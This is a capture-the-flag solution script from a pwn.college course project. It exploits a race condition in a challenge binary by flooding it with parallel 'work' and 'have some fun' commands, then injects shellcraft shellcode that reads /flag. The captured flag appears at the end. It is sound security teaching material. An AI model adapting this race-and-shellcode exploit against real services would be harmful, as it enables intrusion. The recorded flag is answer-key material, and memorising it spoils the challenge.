#!/usr/bin/env python3
import sys
from time import sleep
from multiprocessing import Process
import pwn

'''
==========================================
Final Project - Challenge 1 Solution
Submission by Sparsh Mehta / hutgrabber
UID 119362914
==========================================
## Understanding the Binary:
    The binary, that is found in the `/challenge/challenge1` location on the machine
    operates by opening up a service on port 1337. This binary runs a service that
    allows the user to run commands `work` and `have some fun`. Upon entering said
    commands, the bianry performs respective actions. When the code is decompiled using 
    Ghidra, it can be seen that the work command adds a balance of 100 to an account.
    Upon reading the entire code, it can be found that if the balance exceeds 300
    we will be allowed to run the `have some fun` command. Once that command is run,
    we will be able to get the flag from the `/flag` location.

## Exploitation
    The first part of this code is used to setup a remote connection to the binary
    using the pwntools `REMOTE [SERVER] [PORT]` command. Which allows us to remotely
    interact with a binary.

    In order to exploit this binary by causing a race condition, we will define two functions.
    The first one will run the "work" command on the binary by using the `sendline()` method,
    and the other one will do the exact same thing, but run the "have some fun" commmand on 
    the binary.

    In the end, there is a `for loop` that uses the `Process` library in python to run the the
    defined functions in parallel. We create 3 threads that run the `send_work()` method,
    and one thread that runs the `send_fun()` method. This loop runs hundred times
    which causes a race-condition in the binary that will allow us to run some shellcode that
    is being created using the `pwn.shellcraft()` library.
'''

def start(argv=[], *a, **kw):
    if pwn.args.GDB:  # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath] + argv, gdbscript=gdbscript, *a, **kw)
    elif pwn.args.REMOTE:  # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # run locally, no GDB
        return pwn.process([binPath] + argv, *a, **kw)

binPath = "/challenge/challenge1"
elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)
pwn.context.log_level = "critical"

def send_work():
    io = start()
    io.sendline(b"work")
    print(io.recvline())
    io.close()

def send_fun():
    io = start()
    io.sendline(b"have some fun")
    print(io.recvline())
    io.sendline(pwn.asm(pwn.shellcraft.cat("/flag")))
    io.close()

# Steps for debugging
# send_fun()
# send_work()

for i in range(100):
    work_thread = Process(target=send_work)
    work_thread.start()
    work_thread1 = Process(target=send_work)
    work_thread1.start()
    work_thread2 = Process(target=send_work)
    work_thread2.start()
    fun_thread = Process(target=send_fun)
    fun_thread.start()

'''
Listening for connections on port 1337
Commands:
 - "work"
 - "have some fun"
pwn.college{UEwMEjzZm7nt40rivryTuIoYnk8.dlDM4QDLzEzN1QzW}
Segmentation fault
'''
